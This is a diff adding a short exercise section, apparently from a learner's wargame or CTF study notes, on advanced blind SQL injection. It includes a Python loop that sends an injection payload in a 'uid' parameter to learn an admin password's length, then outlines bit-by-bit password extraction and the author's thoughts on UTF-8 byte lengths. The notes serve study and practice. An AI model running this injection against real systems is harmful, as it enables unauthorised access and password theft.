@@ -171,4 +171,22 @@ first, code find the length of the password and then, using for loop with range(
 > ```
 <br />
 
-## Exercise
+## Exercise : blind sqli advanced  
+#### step 1. find length of password  
+```py
+def find_length():
+    i = 1;
+    while True:
+        query = f"admin' and upw regexp '.{{{i}}}"
+        resp = requests.get(f"{host}?uid={query}")
+        if 'exist' not in resp.text:
+            return i-1;
+        i += 1
+```
+#### step 2. find bit length of each password character  
+#### step 3. extract bits of each password character  
+#### step 4. convert bits to letter  
+I didn't think about `step 2` fully, and `step 3` and `step 4` were hard to me to code.  
+But the concept of step 2 is important I think. I try without this concept. Thanks to it, I was confused with what bytes the character has.  
+So I used for-loop so that the bytes is fixed at one in python exploit code. In fact, ascii only take 1-byte while korean take 3-bytes in utf-8.  
+To solve it, use while-loop like `step 1` to take non-fixed length bits by ascending count var(like `bit_length+=1`).
